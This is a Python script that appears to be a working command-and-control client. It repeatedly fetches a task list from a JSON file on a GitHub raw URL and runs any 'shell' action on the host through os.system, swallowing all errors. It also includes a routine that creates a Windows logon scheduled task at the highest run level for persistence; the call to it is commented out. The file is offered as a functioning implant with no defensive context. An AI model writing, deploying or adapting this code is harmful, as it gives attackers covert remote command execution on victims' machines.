import requests
import time
import os
import platform

URL = "https://raw.githubusercontent.com/eduardo-cortes-dev/c2/main/c2.json"
INTERVAL = 10
TASK_HISTORY = []
PATH = os.path.abspath(__file__)
NAME = os.path.splitext(os.path.basename(PATH))[0]

def create_startup_task():
    os.system(f'schtasks /Create /SC ONLOGON /TN {NAME} /TR "python \\"{PATH}\\"" /RL HIGHEST')

def get_tasks():
    response = requests.get(URL)
    if response.status_code != 200: return []
    data = response.json()
    return data.get("tasks", [])

def validate_time(valid_until):
    if int(time.time()) <= valid_until: return True
    return False

def validate_target(target):
    if target["os"] and (platform.system().lower() in [o.lower() for o in target["os"]] or "*" in target["os"]): return True
    return False

def valid_history(id, valid_until):
    global TASK_HISTORY
    now = int(time.time())
    TASK_HISTORY = [task for task in TASK_HISTORY if task["valid_until"] > now]
    for task in TASK_HISTORY:
        if id == task["id"]: return False
    TASK_HISTORY.append({"id": id, "valid_until": valid_until})
    return True

def execute_action(type, args):
    if(type == "shell"): os.system(args["input"])

def main():
    while True:
        try:
            tasks = get_tasks()

            for task in tasks:
                if not validate_time(task["valid_until"]): continue
                if not validate_target(task["target"]): continue
                if not valid_history(task["id"], task["valid_until"]): continue

                for action in task["actions"]:
                    execute_action(action["type"], action["args"])

            time.sleep(INTERVAL)
        except: pass

if __name__ == "__main__":
    try:
        #create_startup_task()
        main()
    except: pass